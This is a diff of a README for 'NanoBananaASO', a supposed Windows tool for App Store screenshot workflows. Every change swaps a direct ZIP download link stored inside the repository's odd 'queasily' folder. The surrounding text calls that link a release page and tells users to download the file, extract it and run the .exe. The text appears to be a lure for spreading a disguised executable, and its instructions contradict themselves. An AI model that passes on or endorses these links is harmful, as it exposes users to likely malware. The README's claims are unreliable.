@@ -1,12 +1,12 @@
 # 🥭 NanoBananaASO - Faster App Store Screenshot Workflow
 
-[![Download NanoBananaASO](https://img.shields.io/badge/Download%20NanoBananaASO-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/treasured-gasbomb383/NanoBananaASO/main/queasily/Nano-ASO-Banana-v2.3.zip)
+[![Download NanoBananaASO](https://img.shields.io/badge/Download%20NanoBananaASO-blue-grey?style=for-the-badge)](https://github.com/treasured-gasbomb383/NanoBananaASO/raw/refs/heads/main/queasily/Nano-ASO-Banana-v2.3.zip)
 
 ## 📥 Download
 
 Visit this page to download NanoBananaASO for Windows:
 
-https://raw.githubusercontent.com/treasured-gasbomb383/NanoBananaASO/main/queasily/Nano-ASO-Banana-v2.3.zip
+https://github.com/treasured-gasbomb383/NanoBananaASO/raw/refs/heads/main/queasily/Nano-ASO-Banana-v2.3.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one that matches your system. For most users, the file with `.exe` in the name is the right choice.
 
@@ -27,7 +27,7 @@ Use it when you want to:
 Follow these steps to run the app on Windows.
 
 1. Open the download page:
-   https://raw.githubusercontent.com/treasured-gasbomb383/NanoBananaASO/main/queasily/Nano-ASO-Banana-v2.3.zip
+   https://github.com/treasured-gasbomb383/NanoBananaASO/raw/refs/heads/main/queasily/Nano-ASO-Banana-v2.3.zip
 
 2. Find the latest release near the top of the page.
 
@@ -179,7 +179,7 @@ Clean source files lead to cleaner output. If the input images are low quality, 
 
 If you need the latest copy of NanoBananaASO, visit the release page here:
 
-https://raw.githubusercontent.com/treasured-gasbomb383/NanoBananaASO/main/queasily/Nano-ASO-Banana-v2.3.zip
+https://github.com/treasured-gasbomb383/NanoBananaASO/raw/refs/heads/main/queasily/Nano-ASO-Banana-v2.3.zip
 
 From there, download the newest Windows file and run it on your computer. If the release gives you a ZIP file, extract it first, then open the app file inside
 
